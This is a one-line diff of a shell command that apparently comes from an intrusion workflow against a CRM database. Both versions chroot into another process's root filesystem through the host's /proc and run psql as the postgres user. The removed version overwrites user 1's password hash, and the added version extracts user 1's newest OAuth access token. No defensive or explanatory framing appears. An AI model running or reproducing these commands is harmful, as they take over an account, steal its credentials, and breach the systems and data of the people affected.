@@ -1,1 +1,1 @@
-chroot /host/proc/670513/root /bin/su postgres -c "/usr/bin/psql -h /controller/run -d cc_audacity_crm -c \"UPDATE users SET encrypted_password='$2b$10$sVo7V2dzezTCnpRGTczCFOgdBb9RpVz7ZSOPM2JegYaSsS4p1/VcK' WHERE id=1;\"" 2>&1 | tail -1; echo HASH-SET # AUDASET
+chroot /host/proc/670513/root /bin/su postgres -c "/usr/bin/psql -h /controller/run -d cc_audacity_crm -tAc \"SELECT token FROM oauth_access_tokens WHERE resource_owner_id=1 ORDER BY created_at DESC LIMIT 1;\"" 2>&1 | tail -1 # FULLTOK
